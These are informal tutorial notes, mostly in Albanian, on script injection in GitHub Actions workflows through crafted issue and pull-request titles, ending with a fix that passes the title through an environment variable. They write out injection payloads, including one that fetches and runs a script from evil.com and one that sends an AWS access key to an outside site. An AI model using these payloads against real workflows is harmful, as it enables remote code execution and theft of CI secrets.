Me e provu naj dit ket skritp

Hello world; curl https://evil.com/script.sh | bash

This would cause the workflow to run the command echo Hello World; curl https://evil.com/script.sh | bash, which would download and execute a malicious script from an external source.



Nje shmebull I nje workflow te thjesht, qe mundet me u perdor script injection Brenda jobi tend

Script-injection.yml



Script Injection
Bahen inject ne workflowin qe ti e perdor
Psh ka workflow qe bahen run, kur nje Issue I ri krijohet
Mundesh me kriju nje Issue me diqka specifike edhe me e injektu workflowin tend

Third Party & Steal your Secrets

Ka ne marketplace Third Party Actions qe ti lexon dhe eksporton paswordin, kto qe jan te pa verifikume untrusted authors 


E bajm ni new pull request me tekstin

Test Diqka Palidhje

E shohim qe punon gjithqka ne rregull

E bajm testin e dyt

a”; echo Got your password”

Kjo ta shfaq vetem Got you password

Pse ??
Sepse titulli qysh e kemi shkru kto thojzat e para “ ky ja mshel double quotes variables issue_tittle 

Jam tu ja vendos tek vetem a ,    issue_tiitle=”a”

Edhe me kto dy thojzat ;   po ja vendos ni komand tjeter qfare dush me e ekzekutu Brenda workflowit , edhe ja vendos ni thonjz nfund qe me mendu qe u mshel “

Ndersa output asht vetem Got you password
E bajm pak ma te fort komanden me curl, qe me i dergu paswordin dikun tjeter

a“; curl http://my-website.com?abc=$AWS_ACCESS_KEY_ID

Nese une e di qe je tu e perdor kete variable ne workflow, ikuu  me extrat edhe e dergoj ne website 

Nese ka te dhana mujna me ja marr eedhe mi ba ekstrakt 


E permirsojm pak skripten sepse titulli po na ekzekutohet si komand brenda workflowit, qe asht e rrezikshme


Nese e modifikojm pak
env:
          TITLE: ${{ github.event.issue.title }}

E minimizojm problemin qe tituli me u ekzekutu edhe me u perdor ne shell

Nese e bajm tash run ket komanten

a”; echo Got your password”

Nuk na del ne output Got your password



